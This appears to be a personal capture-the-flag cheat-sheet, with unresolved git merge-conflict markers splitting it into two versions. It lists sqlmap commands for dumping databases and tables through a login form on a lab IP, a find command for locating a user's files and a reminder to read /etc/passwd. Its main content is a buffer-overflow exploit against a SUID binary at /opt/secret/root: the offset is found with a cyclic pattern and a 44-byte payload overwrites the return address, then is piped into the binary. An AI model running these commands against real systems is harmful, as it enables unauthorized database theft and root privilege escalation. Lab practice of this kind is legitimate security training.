sqlmap -u url --forms
sqlmap -u http://10.10.33.24/administrator.php --dump --data="username=admin&password=admin"  -> to get the data from the dbs

--dbs -> to get info about databases
-D databasename --tables -> to get tables in that database
-D databasename -T tablename --dump -> dump data from the table

check /etc/passwd to check whether there are accounts 

cd /
find / -user pingu 2>/dev/null

<<<<<<< HEAD
_use this to investigate ELF executable files_
readelf -s filename - to read the symbols(read the address for shell function)

_use this code for cyclic_
#!/bin/python3
from pwnlib.util.cyclic import cyclic_gen
g = cyclic_gen()
print(g.get(50))

_check using cyclic output_
echo -ne "aabaskj" | ./filename -> entering cyclic pattern into the binary file to see where the crash is
dmesg -> see where it crashed
readelf -s filename | grep shell -> to get the shell function address

_inject code_
python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'


=======
_suid file_
/opt/secret/root

gdb /opt/secret/root
r < <(cyclic 50)
cyclic -l 0x6161616c

python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
>>>>>>> f78641a607138374ea5e6285af9a446f9ac414c4
